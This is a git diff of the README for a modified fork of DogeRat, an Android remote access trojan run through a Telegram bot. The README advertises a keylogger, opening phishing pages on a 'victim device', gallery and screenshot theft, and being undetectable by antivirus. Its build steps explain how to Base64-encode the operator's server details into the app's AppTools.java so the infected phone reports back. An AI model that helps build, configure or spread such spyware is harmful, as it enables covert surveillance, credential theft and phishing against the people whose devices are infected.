@@ -1,6 +1,8 @@
-## DISCLAIMER
-This project is a modified verson of [DogeRat](https://github.com/shivaya-dav/DogeRat) by Shivaya Dav
-You can find that here [https://github.com/shivaya-dav/DogeRat](https://github.com/shivaya-dav/DogeRat)
+<h1 align=center>DogeRat</h1>
+
+### DISCLAIMER⚠️
+- Modified verson of [DogeRat](https://github.com/shivaya-dav/DogeRat) by Shiva Yadav.  
+[https://github.com/shivaya-dav/DogeRat](https://github.com/shivaya-dav/DogeRat)
 
 -------------------------
 
@@ -39,8 +41,10 @@ You can find that here [https://github.com/shivaya-dav/DogeRat](https://github.c
 - ✅️ auto start after device boot
 - 🔐 Open any phising page in victim device
 - 🔐 Keylogger {Availbe in apk v1 and v2}
+- 📱 Control Keys (Back, Recent, Home)
+- 🔊 Control device volume
 - ✨ Beautiful telegram bot interface
-- -🤖 Undetectable by antivirus
+- 🤖 Undetectable by antivirus
   ## DOGE RAT PAID VERSION FEATURES
 - 🖥️ Screenshot (get screenshot from your victim device)
 - 📒 Gallery puller (Get all photos available in gallery)
@@ -139,8 +143,8 @@ Copy url and minimize the termux
 To build the application in Android Studio, follow these steps:
 
 1. Open the Android Studio and import the application source code.
-2. Navigate to the following path in the source code: `Utils/AppTools.kt`.
-3. In the `AppTools.kt` file, locate the `data` variable and copy your server information into it.
+2. Navigate to the following path in the source code: `Utils/AppTools.java`.
+3. In the `AppTools.java` file, locate the `data` variable and copy your server information into it.
 4. However, before copying the server information directly into the variable, you must encode it using Base64.
 5. Here is an example JSON structure for your server information:
 ```
@@ -156,11 +160,11 @@ To build the application in Android Studio, follow these steps:
 8. In Android Studio, paste the encoded result into the `data` variable.
 9. The final code should look like this:
 
-```kotlin
-fun getAppData(): AppData {
-    val data = "<your encoded server info>"
-    val text = decode(data)
-    return json().fromJson(text, AppData::class.java)
+```java
+public static AppData getAppData() {
+  String data = "<your encoded server info>";
+  String text = decode(data);
+  return new Gson().fromJson(text, AppData.class);
 }
 ```
 
@@ -179,7 +183,7 @@ fun getAppData(): AppData {
 </p>
 
 <p align="center">
-  <b><i>Important:</i></b> To prevent any fraudulent activity, please ensure that the Instagram username is <a href="https://instagram.com/CyberShieldX"><code>@CYBERSHIELDX</code></a> and the Telegram handle is <a href="https://t.me/CyberShieldX"><code>@CYBERSHIELDX</code></a>. Beware of scams and phishing attempts that use similar usernames or handles.
+  <b><i>Important:</i></b> To prevent any fraudulent activity, please ensure that the Instagram username is <a href="https://instagram.com/diddog.in"><code>@DIDDOG</code></a> and the Telegram handle is <a href="https://t.me/CyberShieldX"><code>@CYBERSHIELDX</code></a>. Beware of scams and phishing attempts that use similar usernames or handles.
 </p>
 
 <p align="center">
